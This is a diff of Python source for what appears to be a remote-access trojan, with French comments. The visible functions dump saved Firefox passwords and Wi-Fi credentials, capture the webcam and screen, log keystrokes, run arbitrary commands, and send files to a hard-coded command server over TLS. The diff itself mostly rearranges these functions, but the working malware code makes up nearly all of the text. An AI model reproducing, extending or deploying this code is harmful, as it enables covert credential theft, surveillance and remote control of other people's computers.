@@ -15,48 +15,6 @@ import cv2
 
 # ========== COMMANDES PERSONNALISÉES ==========
 
-# COMMANDE : firefox
-# fonction pour avoir le chemin absolu de firefox_decrypt.py généré par PyInstaller
-def resource_path(relative_path): 
-    if hasattr(sys, '_MEIPASS'): # MEIPASS est un dossier temporaire créer par PyInstaller
-        return os.path.join(sys._MEIPASS, relative_path)
-    return os.path.abspath(relative_path)
-
-def list_firefox_profiles():
-    try:
-        script_path = resource_path("firefox_decrypt.py")
-        result = subprocess.run(
-            ["python3", script_path, "-l", "--no-interactive"],
-            capture_output=True,
-            text=True
-        )
-        if result.returncode != 0:
-            return f"Erreur :\n{result.stderr.strip()}"
-        return f"Profils Firefox détectés :\n{result.stdout}"
-    except Exception as e:
-        return f"Exception : {e}"
-
-def get_firefox_passwords(profile_number, output_file="firefox_passwords.txt"):
-    try:
-        script_path = resource_path("firefox_decrypt.py")
-        result = subprocess.run(
-            ["python3", script_path, "-f", "human", "--no-interactive", "-c", profile_number],
-            capture_output=True,
-            text=True
-        )
-
-        if result.returncode != 0:
-            return f"Erreur :\n{result.stderr.strip()}"
-
-        with open(output_file, "w") as f:
-            f.write(result.stdout)
-
-        return f"Mots de passe exportés dans {output_file}"
-
-    except Exception as e:
-        return f"Exception : {e}"
-
-
 # COMMANDE : wifi
 def dump_wifi_credentials(output_file="wifi_credentials.txt"):
     try:
@@ -106,7 +64,6 @@ def dump_wifi_credentials(output_file="wifi_credentials.txt"):
     except Exception as e:
         return f"Erreur : {e}"
 
-
 # COMMANDE : download
 def send_files(file_list, sock):
     for filepath in file_list:
@@ -140,7 +97,46 @@ def send_files(file_list, sock):
     sock.send(struct.pack("!I", len(confirmation)))
     sock.send(confirmation.encode())
 
+# COMMANDE : firefox
+# fonction pour avoir le chemin absolu de firefox_decrypt.py généré par PyInstaller
+def resource_path(relative_path): 
+    if hasattr(sys, '_MEIPASS'): # MEIPASS est un dossier temporaire créer par PyInstaller
+        return os.path.join(sys._MEIPASS, relative_path)
+    return os.path.abspath(relative_path)
 
+def list_firefox_profiles():
+    try:
+        script_path = resource_path("firefox_decrypt.py")
+        result = subprocess.run(
+            ["python3", script_path, "-l", "--no-interactive"],
+            capture_output=True,
+            text=True
+        )
+        if result.returncode != 0:
+            return f"Erreur :\n{result.stderr.strip()}"
+        return f"Profils Firefox détectés :\n{result.stdout}"
+    except Exception as e:
+        return f"Exception : {e}"
+
+def get_firefox_passwords(profile_number, output_file="firefox_passwords.txt"):
+    try:
+        script_path = resource_path("firefox_decrypt.py")
+        result = subprocess.run(
+            ["python3", script_path, "-f", "human", "--no-interactive", "-c", profile_number],
+            capture_output=True,
+            text=True
+        )
+
+        if result.returncode != 0:
+            return f"Erreur :\n{result.stderr.strip()}"
+
+        with open(output_file, "w") as f:
+            f.write(result.stdout)
+
+        return f"Mots de passe exportés dans {output_file}"
+
+    except Exception as e:
+        return f"Exception : {e}"
 
 # COMMANDE : webcam
 def capture_webcam(filename="webcam.jpg"):
@@ -160,7 +156,6 @@ def capture_webcam(filename="webcam.jpg"):
     except Exception as e:
         return(f"Exception : {e}")
 
-
 # COMMANDE : screenshot
 def screenshot():
     try: 
@@ -169,7 +164,6 @@ def screenshot():
         return "Capture d'écran sauvegardée en format .jpg sous 'screenshot.jpg'."
     except Exception as e:
         return f"Erreur screenshot : {e}"
-
 
 # COMMANDE : keylogger
 pressed_keys = set()
@@ -222,9 +216,6 @@ def start_keylogger():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
-
-
-
 # COMMANDE : generate_ssh_keypair
 def generate_ssh_keypair(passphrase="test",
                          private_key_path="id_rsa",
@@ -261,7 +252,6 @@ def generate_ssh_keypair(passphrase="test",
     except Exception as e:
         return f"Erreur : {e}"
 
-
 # COMMANDE : all
 def exec_cmd(cmd):
     try:
@@ -271,9 +261,7 @@ def exec_cmd(cmd):
         return f"Erreur exécution : {e}"
 
 
-
 # ========== HANDLE ==========
-
 def get_ip():
     try:
         return subprocess.check_output("hostname -I", shell=True).decode().strip()
@@ -307,7 +295,6 @@ def handle_command(cmd):
 
 
 # ========== CLIENT MAIN ==========
-
 HOST = "192.168.2.4"
 PORT = 12345
 
@@ -320,7 +307,6 @@ sock = socket.create_connection((HOST, PORT))
 client_socket = context.wrap_socket(sock, server_hostname=HOST)
 
 print(f"Connecté au serveur {HOST}:{PORT}")
-
 
 # échange des messages
 try:
@@ -339,8 +325,6 @@ try:
             finally:
                 client_socket.close()
                 break  
-
-
         response = handle_command(command)
         if response is None or str(response).strip() == "":
             response = "[✓]"
